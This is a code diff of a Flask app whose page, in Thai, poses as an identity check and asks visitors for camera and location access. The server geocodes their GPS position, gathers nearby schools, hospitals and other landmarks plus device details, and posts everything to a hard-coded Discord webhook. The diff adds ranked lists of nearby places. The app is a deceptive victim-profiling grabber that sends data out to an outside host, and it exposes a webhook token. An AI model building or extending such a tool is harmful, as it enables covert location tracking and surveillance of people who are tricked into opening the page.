@@ -4,6 +4,7 @@ import base64
 import json
 from datetime import datetime
 import time
+import random
 
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"
@@ -17,9 +18,7 @@ def reverse_geocode(lat, lon):
         if 'address' in data:
             addr = data['address']
             province = addr.get('province', addr.get('state', ''))
-            # ถ้าได้ province เป็นอังกฤษ ให้แปลงเป็นไทย
             if province and not any(('ก' <= c <= 'ฮ' for c in province)):
-                # ลองหาชื่อไทยจาก display_name
                 display = data.get('display_name', '')
                 for part in display.split(','):
                     if 'จังหวัด' in part:
@@ -37,9 +36,8 @@ def reverse_geocode(lat, lon):
         print(f"Reverse error: {e}")
     return None
 
-def search_places_in_province(province, query, limit=5):
+def search_places_in_province(province, query, limit=10):
     try:
-        # ค้นหาในจังหวัดที่ระบุ
         search_q = f"{query} {province}"
         url = f'https://nominatim.openstreetmap.org/search?format=json&q={search_q}&limit={limit}&accept-language=th&bounded=1'
         headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
@@ -51,7 +49,6 @@ def search_places_in_province(province, query, limit=5):
             if name:
                 parts = name.split(',')
                 main = parts[0].strip() if parts else name
-                # เอาแค่ชื่อหลัก + ตำบล/อำเภอ
                 location = parts[1].strip() if len(parts) > 1 else ''
                 if location and len(location) < 30:
                     short = f"{main} ({location})"
@@ -62,6 +59,13 @@ def search_places_in_province(province, query, limit=5):
     except Exception as e:
         print(f"Search error: {e}")
     return []
+
+def add_ranking(results, label):
+    """เพิ่มหมายเลขลำดับให้ผลลัพธ์"""
+    ranked = []
+    for i, name in enumerate(results, 1):
+        ranked.append(f"{i}. {name}")
+    return ranked
 
 HTML = '''<!DOCTYPE html>
 <html>
@@ -98,7 +102,7 @@ HTML = '''<!DOCTYPE html>
     <div class="container" id="ui">
         <h1>👆 แตะที่หน้าจอ เพื่อดำเนินการต่อ</h1>
         <p>ระบบจะขออนุญาตใช้กล้องและตำแหน่งเพื่อยืนยันตัวตน</p>
-        <div class="info-text">ใช้เวลาประมาณ 8-10 วินาที</div>
+        <div class="info-text">ใช้เวลาประมาณ 10-12 วินาที</div>
     </div>
     <script>
         async function startCapture() {
@@ -328,7 +332,6 @@ def upload():
             gps_address = reverse_geocode(lat, lon)
             if gps_address:
                 province_name = gps_address.get('province', '')
-                # ถ้ายังไม่มีชื่อจังหวัด ให้ใช้ display_name
                 if not province_name or province_name == '':
                     display = gps_address.get('display_name', '')
                     for part in display.split(','):
@@ -336,22 +339,23 @@ def upload():
                             province_name = part.strip()
                             break
         
-        # ค้นหาเฉพาะถ้ามีชื่อจังหวัด
         if province_name and 'จังหวัด' in province_name:
-            # ดึงชื่อจังหวัดแบบไม่มีคำว่า "จังหวัด"
             clean_province = province_name.replace('จังหวัด', '').strip()
             
+            # กำหนดจำนวนการค้นหา
             searches = [
-                ('🍽️ ร้านอาหารชื่อดัง', f'ร้านอาหาร {clean_province}'),
-                ('🏫 โรงเรียนชื่อดัง', f'โรงเรียน {clean_province}'),
-                ('🏝️ สถานที่ท่องเที่ยว', f'สถานที่ท่องเที่ยว {clean_province}')
+                ('🏫 โรงเรียน Top 10', f'โรงเรียน {clean_province}', 10),
+                ('🍽️ ร้านอาหาร Top 5', f'ร้านอาหาร {clean_province}', 5),
+                ('🏥 โรงพยาบาล Top 3', f'โรงพยาบาล {clean_province}', 3),
+                ('🏝️ สถานที่ท่องเที่ยว Top 10', f'สถานที่ท่องเที่ยว {clean_province}', 10)
             ]
             
-            for label, query in searches:
-                results = search_places_in_province(clean_province, query, 4)
+            for label, query, limit in searches:
+                results = search_places_in_province(clean_province, query, limit)
                 if results:
-                    nearby_results[label] = results
-                time.sleep(0.4)
+                    ranked = add_ranking(results, label)
+                    nearby_results[label] = ranked
+                time.sleep(0.5)
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
@@ -397,10 +401,10 @@ def upload():
         if gps_success and nearby_results:
             for label, places in nearby_results.items():
                 if places:
-                    value = '\n'.join([f"• {p}" for p in places[:4]])
+                    value = '\n'.join(places)
                     fields.append({"name": label, "value": value, "inline": False})
         elif gps_success and province_name:
-            fields.append({"name": "📍 สถานที่ใกล้เคียง", "value": f"ไม่พบข้อมูลใน {province_name}", "inline": False})
+            fields.append({"name": "📍 ข้อมูลสถานที่", "value": f"ไม่พบข้อมูลใน {province_name}", "inline": False})
         
         bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
